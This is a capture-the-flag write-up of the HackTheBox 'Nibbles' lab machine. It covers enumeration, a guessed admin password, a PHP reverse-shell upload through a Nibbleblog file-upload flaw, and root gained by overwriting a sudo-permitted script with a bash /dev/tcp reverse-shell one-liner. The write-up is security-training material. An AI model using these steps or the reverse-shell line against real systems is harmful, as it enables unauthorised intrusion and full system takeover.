---
layout: page
title: HackTheBox Nibbles Writeup
---

Nibble is a box that is running a `nibbleblog` site which has a known exploit with an associated metasploit module. Though for the exploit module to work, credentials are needed. By enumerating the web directories on the system, a `users.xml` file was found that showed in plaintext an administrator account. From there, I was able to guess a relatively easy password to gain initial access onto the system. PrivEsc involved finding binaries that the user we logged onto as can run without a password.

### Enumeration

Starting off with a basic enumeration scan: ```nmap -sC -sV -oA nibbles 10.10.10.75```

Here's what it outputs:

![image](https://user-images.githubusercontent.com/41026969/73245301-ecec9f80-4179-11ea-96ec-ea6e22e3fd65.png)

So we see there's a ssh server and a web server being hosted on this machine. Since we don't have any creds for ssh yet, I first check out the webpage:

![image](https://user-images.githubusercontent.com/41026969/73312921-db49dd00-41f7-11ea-8c99-d5d43e258f78.png)

Checking the source (on FireFox ESR, ```CTRL``` + ```u```) we see there's a hidden directory:

```
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Going to ```http://10.10.10.75/nibbleblog/``` to check it out shows some kind of portal:

![image](https://user-images.githubusercontent.com/41026969/73313001-13e9b680-41f8-11ea-81c8-f1be6adba61c.png)

I initially did a gobuster scan on the main homepage ```http://10.10.10.75``` and it didn't find anything. Though trying a gobuster scan on ```http://10.10.10.75/nibbleblog/``` (using the ```directory-list-2.3-medium```) outputs:

![image](https://user-images.githubusercontent.com/41026969/73313521-7c856300-41f9-11ea-89db-e960aef7edfc.png)

Looking at the ```README``` directory:

![image](https://user-images.githubusercontent.com/41026969/73313695-e7cf3500-41f9-11ea-86f7-9aa5ec46ecce.png)

We see that the web server has ```Nibbleblog version 4.0.3 codename Coffee``` installed.

##### Finding an exploit for later use

Looking up vulnerabilities for this version of Nibbleblog, there are multiple articles about file uploading:

![image](https://user-images.githubusercontent.com/41026969/73314010-b99e2500-41fa-11ea-87f6-7ff607809d93.png)

We see there's a [Rapid7](https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload) page about it. In this article, it describes the vulnerability. ```Nibbleblog contains a flaw that allows an authenticated remote attacker to execute arbitrary PHP code. This module was tested on version 4.0.3.``` Though a thing to note about this is that we need to be on an authenticated account. So we need to keep enumerating those web directories for some credentials...

Reading more into the vulnerability, a list of steps can be found on [this webpage](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html). Where we basically have to upload an image containing php code and running it by visiting a specific location/URL which will then execute the code. 

Looking around I eventually end up in the ```/content/private/users.xml``` page. Checking out the page shows there's a single user ```admin```. It is also worth noting that there seems to be a firewall/blacklist system in place to guard against bruteforcers. Here's a screenshot of it below:

![image](https://user-images.githubusercontent.com/41026969/73314486-020a1280-41fc-11ea-871e-3e6c62829e81.png)

Doing further enumeration checks by this time adding ```php``` to list of file extensions to find any extra webpages/files:

```
noodle@kali:~/Desktop/Hacky Sack/htb-nibbles$ gobuster dir -u 10.10.10.75/nibbleblog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 200 -o gobuster_results.txt
```

Outputs the following:

![image](https://user-images.githubusercontent.com/41026969/74098356-3b3c5f80-4ae5-11ea-85ae-68c200a0e0c8.png)

Visiting each of the pages, eventually coming across ```/admin.php``` we see there's an admin login page that was previously not seen:

![image](https://user-images.githubusercontent.com/41026969/74098395-b6057a80-4ae5-11ea-81b3-4772b7a604e7.png)

Knowing before, we know of at least one user: ```admin```. Doing some careful guess and checking I eventually try ```nibbles``` as the password at it worked, revealing this home screen:

![image](https://user-images.githubusercontent.com/41026969/74098423-011f8d80-4ae6-11ea-942f-610601078c52.png)

### Exploitation

Going back to [this source](page explaining the image upload vulnerability from cve details webpage (above)](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html) that lists steps on executing the exploit shows we need to upload some php code. Below are the steps listed on the website above:

![image](https://user-images.githubusercontent.com/41026969/74098470-77bc8b00-4ae6-11ea-91f5-aabd267d6885.png)

The first step is done, we have gained admin credentials into the portal. The second step is activating the my image plugin. From the main site, going to ```Plugins``` shows that ```My image``` is already installed. Clicking the "Configure" button under it brings up a menu we can upload a picture to. The third step is uploading a PHP shell...

I use one of the default kali PHP webshells ([read more on kali webshells here](https://tools.kali.org/maintaining-access/webshells)): 

```
noodle@kali:~/Desktop/Hacky Sack/htb-nibbles$ cp /usr/share/webshells/php/php-reverse-shell.php .
```

##### Explanation of above: ```cp``` is copy, ```/usr/share...``` is the file I'll be copying, and ```.``` is the place I'll be copying to, in Linux, ```.``` represents the current directory. 

Before I upload the file, I need to configure it by putting my IP and port number that I'll be listening to:

![image](https://user-images.githubusercontent.com/41026969/74098604-33ca8580-4ae8-11ea-9775-e7316edf4d33.png)

Now to upload this php file, I go back to the website and in the configure screen of the "My image" plugin; there's a ```Browse``` button to upload a file which I upload the php file to.

The next step according to the website is to go to ```http://localhost/nibbleblog/content/private/plugins/my_image/image.php``` page (changing the localhost address to the IP address). But before I navigate to that directory, I must first set up a netcat listener by doing ```noodle@kali:~/Desktop/Hacky Sack/htb-nibbles$ nc -nvlp 4444```.

Now visiting the address ```10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php```:

![image](https://user-images.githubusercontent.com/41026969/74098639-8310b600-4ae8-11ea-8154-a7b92ad6824f.png)

We get a shell!

### Post Exploitation - More Enumeration & Privesc

Looking aroud the machine, the user flag is found at ```/home/nibbler/user.txt```.

To do further enumeration, I use [LinEnum](https://github.com/rebootuser/LinEnum) which will gather a bunch of information about the box. To get it on the remote box, I first copy ```LinEnum.sh``` into my current working directory, then I do ```python -m SimpleHTTPServer```. Then on the remote box, I do ```wget 10.10.14.3:8000/LinEnum.sh``` to download the file. Then to run it first give it permissions ```chmod +x LinEnum.sh``` then ```./LinEnum.sh```.

Running it we see something interesting:

![image](https://user-images.githubusercontent.com/41026969/74098786-02eb5000-4aea-11ea-9dda-63df48328428.png)

We can use the sudo command to run a ```monitor.sh``` file inside the directory ```/home/nibbler/personal/stuff``` meaning we have to do ```unzip personal.zip``` to unzip the file. Going inside the personal directory there is a ```stuff``` directory and going inside that directory there is the ```monitor.sh``` file. 

To edit the file (or to change it altogether) on the target box, I did ```rm monitor.sh``` to remove the original file as we'll be uploading our own sh file. Then on the host machine, I create an sh file (also named ```monitor.sh```) that will contain a bash command to get a reverse shell. I get a bash one-liner command from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and on the top of the file I put ```#!/bin/bash``` to show we're executing bash commands. So this is how the file looks like:

```
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.3/4445 0>&1
```

##### Note: I changed the IP/Port address to my own IP and I'll be listening on port 4445

To get it on the target host, I do the same thing from earlier: on my host machine I use ```python -m SimpleHTTPServer``` to make the files available and then on the target host machine I use ```wget 10.10.14.3:8000/monitor.sh``` to get the new ```monitor.sh``` file I created. Note for this machine you need to download the ```monitor.sh``` file inside the correct directories. Then I give it permission to execute: ```chmod +x monitor.sh```

Creating a listener on port 4445 by doing ```ncat -nvlp 4445``` and then running the new ```monitor.sh``` file by doing ```./monitor.sh```... I get a new shell!

![image](https://user-images.githubusercontent.com/41026969/74099001-a76e9180-4aec-11ea-9115-98a4f838a4e7.png)

Doing an ```id``` check shows we have uid/gid of 0 which means we are root.

Looking around, the root flag is found in ```/root/root.txt```. 

### Flag Locations
user: ```/home/nibbler/user.txt```

root: ```/root/root.txt```

### Sources
- [cve details webpage on nibbleblog vulnerability](https://www.cvedetails.com/cve/CVE-2015-6967/)
- [page explaining the image upload vulnerability from cve details webpage (above)](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html)
- [Kali web shells](https://tools.kali.org/maintaining-access/webshells)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [PentestMonkey reverse shells](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [IppSec video writeup](https://www.youtube.com/watch?v=s_0GcRGv6Ds)

### Post-Machine Analysis/Reflection
- Learned that when using gobuster, add in the php extension to find additional webpages. On dirbuster, php is already the default file extension.
- Credentials aren't always stored in plaintext somewhere on a server, some guess/check might be needed.
- Learned that there's a difference between bash and sh [from reading this page](https://askubuntu.com/questions/141928/what-is-the-difference-between-bin-sh-and-bin-bash). There's also difference between ```#!/bin/bash``` and ```#!/bin/sh``` because initially running the command without the ```#!/bin/bash``` at the top did not work (but afterwards, adding it solved the issue).
- Sometimes, we have to make sure ```.sh``` files are executable (```chmod +x file_name.sh```).
- this python one liner can make a reverse shell look better: ```python -c 'import pty; pty.spawn("/bin/bash")'```.